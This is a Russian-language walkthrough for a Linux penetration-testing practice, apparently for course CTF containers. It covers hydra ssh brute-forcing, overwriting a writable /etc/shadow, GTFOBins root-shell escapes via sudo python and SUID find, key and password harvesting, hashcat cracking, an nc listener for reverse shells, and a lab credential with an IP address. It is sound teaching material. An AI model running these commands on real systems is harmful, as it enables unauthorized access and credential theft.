
# Практика Linux

В данной практике речь пойдет о полезных командах и утилитах в Linux которые позволят выполнить Privilege Escalation (PE), подключиться к удаленному хосту по ssh, брутфорсить пароли пользователей, вытаскивать пароли из hashcat, а также перенаправить трафик с помощью netcat.

Все материалы и докер-контейнеры оставлены в данном репозитории, помимо этого написан скрипт автоматической установки docker, настройки и остановки контейнеров (запусткать с sudo).

Если вы делаете данное задание самостоятельно на своей машине, то за место host подставляете localhost

- Установка docker на машину:
```bash
sudo sh docker_install.sh
```
- Запуск всех контейнеров:
```bash
sudo sh build_dockers.sh
```
- Остановка всех контейнеров:
```bash
sudo sh stop_dockers.sh
```

## ssh_missconfig:
#### Флаг в /root/flag.txt
В задании указано, что ssh работает на 2222 порту поэтому, можем попробовать подключиться, так как имя учетки не дано, то можно попробовать это сделать под root:
```bash
ssh root@<host> -p 2222
```

Пароль мы не знаем, поэтому на помощь идет гидра и любезно оставленный организаторами файл с паролями:

```bash
hydra -l root -P /path/to/wordlist.txt ssh://<host> -t 4 -V -s 2222
```
Получив пароль от рута коннектимся к машине и читаем флаг в корневой директории рута.

#### Стоит отметить, что аутентификация по паролю встречается редко, еще реже встречается доступ под пользователем root по ssh, обычно ssh настраивается так, чтобы подключение происходило по ключам, а доступ по ssh не дается пользователю root.

## writable_shadow:
#### Флаг в /root/flag.txt
В задании сразу указан пользователь для подключения (mega_user) и 2223 порт, но не указан пароль, поэтому снова используем гидру:
```bash
hydra -l root -P /path/to/wordlist.txt ssh://<host> -t 4 -V -s 2223
```

Получаем пароль от пользователя и заходим на машину.

Тут в дело вступает внимательность, атакующий первым делом должен посмотреть права доступа к критическим файлам и бинарникам (в данном случае у нас открыт на запись и чтение файл /etc/shadow)

#### Файл /etc/shadow хранит хэши паролей пользователей, тем самым они представлены не явно, в идеальном варианте файл /etc/shadow должен быть доступен только пользователю root и никому другому, так как можно подменить хэш любого пользователя.

Используя nano, можно зайти и поменять хэш рута на хэш пользователя mega_user, тем самым мы изменим пароль рута на пароль пользователя mega_user.

```bash
nano /etc/shadow
```

После этого меняем пользователя на root и читаем флаг в директории рута:

```bash
su root
```

## find_me:
#### Флаг где-то спрятан
Данная машина позволит познакомиться с одной из самых полезных и часто используемых утилит для пентеста - nmap.
В задании нам лиш дан ip адрес машины, в таких случаях рекомендуется использовать nmap для просмотра всех открытых портов на данной машине.

```bash
nmap -sC -sV <host> -p-
```
#### Параметр -p- позволяет просканировать все возможные порты. По умолчанию nmap сканирует лишь определенный диапазон портов.

После того как машина будет просканирована, найдем открытый 7913 порт, на котором расположен http-сервер, используя браузер, подключимся к нему.

```bash
http://<host>:7913
http://91.149.223.24:7913
```
Сразу в корне нас будет ожидать флаг.

## sudo_privilege:

#### Флаг в /root/flag.txt
В задании указаны креды для подключения (mega_user:BJJdhGB1ullQ9_hK-gJ972)

Название задание и есть подсказка для решения данной машины, для этого можно вывести список всех программ, которые пользователь может запускать от sudo:

```bash
sudo -l
```

Нам выведется единственная программа, а именно python, зная это можно воспользоваться сайтом [GTFOBins](https://gtfobins.github.io), в котором представлены основные способы поднятия привилегий при неправильной настройки прав доступа.

Ищем эксплойт для python и находим следующее:

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```
Тем самым мы получаем оболочку рута, далее остается только прочитать флаг

#### Права на запуск приложений от sudo следует давать с особой осторожностью, важно помнить, что приложения запущенные от sudo имеют права пользователя root.

## take_my_cert:
#### Флаг в /root/flag.txt и /home/master/flag.txt
В данном задании содержатся два флага, можно найти уязвимость которая позволит получить сразу два флага, один находится в домашней директории пользователя master, а другой в root. Также нам дан закрытый ключ для подключения под пользователем mega_user.

Для начала необходимо скачать закрытый ключ и ограничить права на доступ к нему (иначе ssh будет ругаться):

```bash
chmod 700 /path/to/key
```

Затем подключаемся под пользователем mega_user используя наш ключ:

```bash
ssh -i /path/to/key mega_user@<host> -p 2225
```

Подключившись проверяем директорию /home и видим там еще одного пользователя master, посмотрев содержимое его домашней директории видим там два файла master и master.pub - понимаем что это ssh-ключи, которые оставил данный пользователем открытыми для чтения, т.к для подключения используется закрытый ключ, то скопируем его на нашу машину (можно просто вывести через cat и скопировать). Далее попробуем открыть новое ssh-соединение но уже от пользователя master с новоприобретенным ключом, а далее читаем флаг в его директории.

```bash
ssh -i /path/to/master_key master@<host> -p 2225
```

### Альтернативное решение

Проверим наличие файлов содержащих суидный бит

```bash
find / -type f -perm -u=s -user root -ls 2>/dev/null
```

Нам выведется список файлов, и вновь на помощь приходит [GTFOBins](https://gtfobins.github.io), там мы можем посмотреть список файлов и эксплойтов к ним при установленном флаге suid. Понимаем что бинарник это find, используем эксплойт:

```bash
find . -exec /bin/sh -p \; -quit
```
После этого мы получим оболочку с правами рута, поэтому можем прочитать флаг в его директории :)

### Вот список полезных ссылок про suid, его использование для поднятия привилегий:

- [SUID Executables- Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [Я есть root. Повышение привилегий в ОС Linux через SUID/SGID](https://habr.com/ru/companies/jetinfosystems/articles/506750/)
- [Suid - Wikipedia](https://ru.wikipedia.org/wiki/Suid)

## hash_mainkun
Для начала нам дан файл с хэшами и работниками, исходя их этого понимаем, что нужно использовать hashcat и словарь, который прикреплен к заданиям:

```bash
hashcat -m 0 -a 0 /path/to/hashes /path/to/wordlist --show
```

Получаем список паролей, который будем использовать для подключения, для перебора пользователей и паролей будем использовать гидру:

```bash
hydra -L /path/to/workers -P /path/to/wordlist ssh://<host> -t 4 -V -s 2226
```

После подбора кредов подключаемся под пользователем, который подобрался

Попав на машину необходимо отыскать креды пользователя, довольно неприятное занятие если делать это вручную, поэтому воспользуемся командой:

```bash
grep -rn /etc/ -e 'pass' 2>/dev/null
```

Оказывается, что кто-то оставил пароль от рута в sshd_config, используем данный пароль и читаем флаг в /root/flag.txt

## Остальные команды которые обсуждались (или нет) на практике:

- Поднятие сервера на python для прокидывания файлов:
Выполняем на машине, с которой хотим прокинуть файл, для просмотра будет доступна директория с которой была запущена команда
```bash
python3 -m http.server 80
```
На машине, на которую прокидываем файл выполняем
```bash
wget http://<host>/file
```

- Прослушивание порта через nc (очень часто необходимо при прокидывании reverse-shell):
```bash
nc -lvnp <порт>
```
[Генератор reverse-shell](https://www.revshells.com)




